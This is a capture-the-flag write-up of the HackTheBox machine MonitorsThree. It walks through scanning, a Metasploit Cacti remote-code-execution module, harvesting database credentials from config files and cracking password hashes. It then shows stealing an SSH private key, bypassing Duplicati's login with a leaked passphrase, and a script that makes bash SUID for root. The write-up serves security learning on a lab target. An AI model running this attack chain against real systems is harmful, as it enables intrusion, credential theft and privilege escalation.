# MonitorsThree

<figure><img src="../../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

## Port scan

```bash
╰─➤  fn 10.129.153.14              
Running initial fast Nmap scan on 10.129.153.14...
Open ports: 22,80
Running detailed Nmap scan on ports: 22,80...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 21:29 IST
Nmap scan report for 10.129.153.14 (10.129.153.14)
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.06 seconds
Scan complete. Results saved in ports.scan

```



## Subdomain scan

```bash
─➤  ffuf -u http://monitorsthree.htb/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.monitorsthree.htb'  -fw 3598 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsthree.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.monitorsthree.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3598
________________________________________________

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 279ms]
:: Progress: [4989/4989] :: Job [1/1] :: 213 req/sec :: Duration: [0:00:23] :: Errors: 0 ::

```



## Web Attack (SQLi)

Upon googling the Cacti version that the server is using, I found this:\
[https://github.com/Cacti/cacti/security/advisories/GHSA-cx8g-hvq8-p2rv](https://github.com/Cacti/cacti/security/advisories/GHSA-cx8g-hvq8-p2rv)\
\


### Metasploit module -> www-data shell

```bash
use multi/http/cacti_package_import_rce
set RHOSTS cacti.monitorsthree.htb
set LHOST tun0
set password greencacti2001

run
#shell
```

After a whlie, I found juicy data ...

#### NOTE:&#x20;

These are few cmds i usually use to get passwords (if any).

```bash
grep -irl "password"
grep -irl "password" | grep config
```

I found cacti dbs' username and password

```bash
www-data@monitorsthree:~/html$ grep -irl "password" | grep config
grep -irl "password" | grep config
cacti/include/config.php
cacti/include/config.php.dist
www-data@monitorsthree:~/html$ cat cacti/include/config.php
cat cacti/include/config.php
<?php
<<__SNIPPED__>>

$database_default  = 'cacti';
$database_hostname = 'localhost';
$database_username = 'cactiuser';
$database_password = 'cactiuser';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
$database_persist  = false;

<<__SNIPPED__>>


```

Since I don't have a proper tty shell, I will make use of `-e` flag of mysql to run query with cli arguments

```bash
#make a custom binary just for ease of use
echo 'mysql -u cactiuser -pcactiuser -e "$1"' > /tmp/cacdb
chmod +x /tmp/cacdb
export PATH=/tmp:$PATH

www-data@monitorsthree:~/html/cacti/resource$ cacdb 'show databases'
cacdb 'show databases'
+--------------------+
| Database           |
+--------------------+
| cacti              |
| information_schema |
| mysql              |
+--------------------+

```

Extract username and passwords for marcus user

```bash
www-data@monitorsthree:~/html/cacti/resource$ cacdb 'use cacti;select * from user_auth'
cacdb 'use cacti;select * from user_auth'
+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
| id | username | password                                                     | realm | full_name     | email_address            | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |
+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
|  1 | admin    | $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G |     0 | Administrator | marcus@monitorsthree.htb |                      |                 | on        | on        | on           | on             |          2 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 | -1               |        |               0 |        0 |   436423766 |
|  3 | guest    | $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu |     0 | Guest Account | guest@monitorsthree.htb  |                      |                 | on        | on        | on           |                |          1 |             1 |            1 |            1 |                      1 |         |         -1 |        -1 | -1               |        |               0 |        0 |  3774379591 |
|  4 | marcus   | $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK |     0 | Marcus        | marcus@monitorsthree.htb |                      | on              | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 |                  |        |               0 |        0 |  1677427318 |
+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+

```

## User shell&#x20;

I used john to crack the password

```bash
╰─➤  john --wordlist=/usr/share/wordlists/rockyou.txt marcus.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
12345678910      (?)     
1g 0:00:00:01 DONE (2024-08-27 22:10) 0.5263g/s 303.1p/s 303.1c/s 303.1C/s 12345678910..parola
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                          
```

But unfortunately we can't use the password to sign in as user (permission denied)

```bash
╰─➤  ssh marcus@monitorsthree.htb
The authenticity of host 'monitorsthree.htb (10.129.41.151)' can't be established.
ED25519 key fingerprint is SHA256:1llzaKeglum8R0dawipiv9mSGU33yzoUW3frO9MAF6U.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes       
Warning: Permanently added 'monitorsthree.htb' (ED25519) to the list of known hosts.
marcus@monitorsthree.htb: Permission denied (publickey).
```

### Workaround

Simply do `su - marcus` on the existing `www-data` shell we have and enter the password

```bash
www-data@monitorsthree:~/html/cacti/resource$ su - marcus
su - marcus
Password: 12345678910

marcus@monitorsthree:~$ id
id
uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)
marcus@monitorsthree:~$ 
# VoiLA!!
```

Retrieve the **private key** from `/home/marcus/.ssh/id_rsa` and we can now ssh into box to have proper shell (FINALLY)

```bash
╰─➤  chmod 600 marcus.privkey    
                                                                                                                                                                                                                                               
╰─➤  ssh marcus@monitorsthree.htb -i marcus.privkey 
Last login: Tue Aug 20 11:34:00 2024
marcus@monitorsthree:~$ id
uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)
marcus@monitorsthree:~$ 
```

## Root shell

If we see `/opt` directory, we find docker-compose file.

I used `netstat` command to find other ports running on the internal system\
Found one app on port `8200`

```bash
ssh -L 4444:localhost:8200 marcus@monitorsthree.htb -i marcus.privkey
#port forwarding the internal app
```

### Duplicati auth bypass

{% embed url="https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee" %}

If we follow the above medium blog, we can bypass the authentication.

* Take imp data from Duplicati .sqlite db

```bash
sqlite> select * from Option;
<<SNIPPED>>
-2||last-webserver-port|8200
-2||is-first-run|
-2||server-port-changed|True
-2||server-passphrase|Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
-2||server-passphrase-salt|xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=
-2||server-passphrase-trayicon|c0489d53-47d2-42ce-87d9-5f2fe4add12c
-2||server-passphrase-trayicon-hash|j6iP1Rmk39mdwq4mkP6wVkLTASWb89sIHM0qKJOeUhw=
-2||last-update-check|638604126643204640
<<SNIPPED>>
```

Take the server-passphrase from the file and follow the steps from the medium blog.\


### root shell

```bash
marcus@monitorsthree:/tmp$ cat ba.sh
#!/bin/bash
/source/usr/bin/chmod 4777 /source/bin/bash
```

Add the script in Duplicati settings

<figure><img src="../../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

> **You can have the&#x20;**_**run-script-before-required**_**&#x20;option from "Add advanced option"**

<figure><img src="../../../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>

Click on **Run now** and you will get `/bin/bash` with SUID privileges.

<figure><img src="../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

\_\_\_\_\_\_\_\_\_\_\_heapbytes' still pwning.
